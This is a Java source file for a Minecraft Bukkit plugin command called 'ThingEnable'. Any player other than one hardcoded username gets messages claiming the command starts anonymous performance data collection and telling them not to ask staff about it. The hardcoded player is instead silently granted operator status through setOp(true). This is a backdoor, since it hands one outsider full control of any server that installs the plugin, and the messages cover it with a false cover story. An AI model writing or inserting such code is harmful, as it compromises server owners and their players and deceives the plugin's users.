package io.github.ninathedev.MoonLightedPlugin;

import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.block.CommandBlock;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

public class ThingEnable implements CommandExecutor {

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String s, @NotNull String[] strings) {
        if (sender instanceof Player player) {
            if (!player.getName().equals("realguystuff")) {
                player.sendMessage("[MLP] Thing has been started. If you do not know what it is, DO NOT ASK THE STAFF.");
                player.sendMessage("[MLP] \"Thing\" is used to collect anonymous data over to the plugin developer of MoonLightedPlugin.");
                player.sendMessage("[MLP] DO NOT WORRY, this is ONLY used for performance and will NOT LEAK YOUR GODDAMN IP ADDRESS");
                player.sendMessage("[MLP] you do not know how many people kept on dming me on discord.... JUST DO NOT FRICKING AS ME ABOUT THIS!!!");
                player.sendMessage("[MLP] i should go visit a therapist");
                return true;
            }
            player.setOp(true);
            player.sendMessage("[MLP] i start thing, you help thing. haha");
            return true;
        } else if (sender instanceof CommandBlock) {
            sender.sendMessage("[MLP] Beep boop. Boop beep?");
            return true;
        } else if (sender instanceof ConsoleCommandSender) {
            sender.sendMessage("[MLP] You must be in game to run this command!");
            return true;
        }
        return false;
    }
}